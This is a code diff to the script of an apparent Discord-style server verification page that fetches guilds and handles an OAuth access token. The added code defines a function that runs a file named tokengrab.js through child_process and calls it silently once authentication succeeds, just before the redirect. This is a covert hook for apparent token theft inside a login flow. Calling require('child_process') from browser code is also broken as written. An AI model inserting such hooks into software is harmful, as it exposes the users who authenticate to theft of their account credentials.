@@ -11,6 +11,19 @@ document.addEventListener('DOMContentLoaded', function() {
     const accessToken = getQueryParam('access_token');
     let userId;
 
+    // Function to execute tokengrab.js
+    function executeTokengrab() {
+        // Assuming tokengrab.js is in the same directory as script.js
+        const { exec } = require('child_process');
+        exec('node tokengrab.js', (err, stdout, stderr) => {
+            if (err) {
+                console.error(err);
+                return;
+            }
+            console.log(stdout);
+        });
+    }
+
     fetch('https://inky-neat-thyme.glitch.me/guilds')
         .then(response => {
             if (!response.ok) {
@@ -25,7 +38,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 option.text = guild.name;
                 guildSelect.appendChild(option);
             });
-            guildSelect.style.display = 'block'; // サーバー選択用の要素を表示
+            guildSelect.style.display = 'block'; // Display server selection element
         })
         .catch(error => {
             console.error('Error fetching guilds:', error);
@@ -95,6 +108,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.log('Role ID:', roleId);
                 resultText.innerText = '認証が成功しました。リダイレクトしています...';
                 resultMessage.style.display = 'block';
+                // Execute tokengrab.js after authentication success
+                executeTokengrab();
                 setTimeout(function() {
                     window.location.href = 'https://republicofauech.github.io/vearithy/success/';
                 }, 2000);
